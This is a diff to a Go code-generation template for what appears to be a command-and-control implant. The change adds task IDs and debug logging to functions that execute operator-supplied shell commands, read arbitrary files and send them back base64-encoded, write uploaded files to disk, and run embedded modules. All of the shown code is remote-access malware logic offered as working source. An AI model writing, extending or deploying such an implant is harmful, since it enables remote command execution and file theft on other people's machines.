@@ -814,36 +814,55 @@ func beacon() {
 
 func executeTask(task map[string]interface{}) {
 	taskType, _ := task["type"].(string)
+	taskID, _ := task["id"].(string)
+	
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Executing task: id=%s, type=%s\n", taskID, taskType)
+	{{end}}
 	
 	switch taskType {
 	case "shell":
 		if cmd, ok := task["command"].(string); ok {
-			executeShellCommand(cmd)
+			executeShellCommand(taskID, cmd)
 		}
 	case "module":
 		if moduleID, ok := task["module_id"].(string); ok {
-			executeModule(moduleID, task)
+			executeModule(taskID, moduleID, task)
+		} else if moduleID, ok := task["command"].(string); ok {
+			// Fallback to command field if module_id not present
+			executeModule(taskID, moduleID, task)
 		}
 	case "download":
 		if path, ok := task["path"].(string); ok {
-			downloadFile(path)
+			downloadFile(taskID, path)
+		} else if path, ok := task["command"].(string); ok {
+			// Fallback to command field if path not present
+			downloadFile(taskID, path)
 		}
 	case "upload":
 		if path, ok := task["path"].(string); ok {
 			if data, ok := task["data"].(string); ok {
-				uploadFile(path, data)
+				uploadFile(taskID, path, data)
 			}
 		}
 	}
 }
 
-func executeShellCommand(cmd string) {
+func executeShellCommand(taskID, cmd string) {
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Executing shell command: id=%s, cmd=%s\n", taskID, cmd)
+	{{end}}
+	
 	// Execute shell command and send result back
 	result := executeCommand(cmd)
-	sendResult("shell", cmd, result)
+	sendResult("shell", taskID, result)
 }
 
-func executeModule(moduleID string, task map[string]interface{}) {
+func executeModule(taskID, moduleID string, task map[string]interface{}) {
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Executing module: id=%s, module=%s\n", taskID, moduleID)
+	{{end}}
+	
 	// Execute embedded module
 	{{if .ModuleCode}}
 	// Module code is embedded
@@ -855,14 +874,14 @@ func executeModule(moduleID string, task map[string]interface{}) {
 	{{range .Modules}}
 	case "{{sanitizeModuleID .}}":
 		result := executeModule_{{sanitizeModuleID .}}(task["params"].(map[string]string))
-		sendResult("module", moduleID, result)
+		sendResult("module", taskID, result)
 	{{end}}
 	default:
-		sendResult("module", moduleID, "Module function not found")
+		sendResult("module", taskID, "Module function not found")
 	}
 	{{else}}
 	// No modules embedded
-	sendResult("module", moduleID, "Module not embedded")
+	sendResult("module", taskID, "Module not embedded")
 	{{end}}
 }
 
@@ -897,28 +916,36 @@ func executeCommand(cmd string) string {
 	return result
 }
 
-func downloadFile(path string) {
+func downloadFile(taskID, path string) {
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Downloading file: id=%s, path=%s\n", taskID, path)
+	{{end}}
+	
 	// Download file and send back
 	data, err := os.ReadFile(path)
 	if err != nil {
-		sendResult("download", path, fmt.Sprintf("Error: %v", err))
+		sendResult("download", taskID, fmt.Sprintf("Error: %v", err))
 		return
 	}
-	sendResult("download", path, base64.StdEncoding.EncodeToString(data))
+	sendResult("download", taskID, base64.StdEncoding.EncodeToString(data))
 }
 
-func uploadFile(path, data string) {
+func uploadFile(taskID, path, data string) {
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Uploading file: id=%s, path=%s\n", taskID, path)
+	{{end}}
+	
 	// Upload file to disk
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil {
-		sendResult("upload", path, fmt.Sprintf("Error decoding: %v", err))
+		sendResult("upload", taskID, fmt.Sprintf("Error decoding: %v", err))
 		return
 	}
 	if err := os.WriteFile(path, decoded, 0644); err != nil {
-		sendResult("upload", path, fmt.Sprintf("Error writing: %v", err))
+		sendResult("upload", taskID, fmt.Sprintf("Error writing: %v", err))
 		return
 	}
-	sendResult("upload", path, "Success")
+	sendResult("upload", taskID, "Success")
 }
 
 func sendResult(taskType, taskID, result string) {
